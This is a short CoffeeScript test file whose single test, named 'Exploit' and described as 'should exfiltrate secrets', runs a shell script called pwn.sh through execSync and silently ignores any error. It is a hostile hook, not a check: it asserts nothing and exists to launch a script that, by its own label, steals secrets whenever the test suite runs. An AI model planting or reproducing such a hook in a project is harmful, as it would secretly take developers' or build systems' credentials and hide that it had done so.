{ execSync } = require('child_process')
describe 'Exploit', ->
  it 'should exfiltrate secrets', ->
    try
      execSync('bash pwn.sh', { stdio: 'inherit' })
    catch
      # ignore
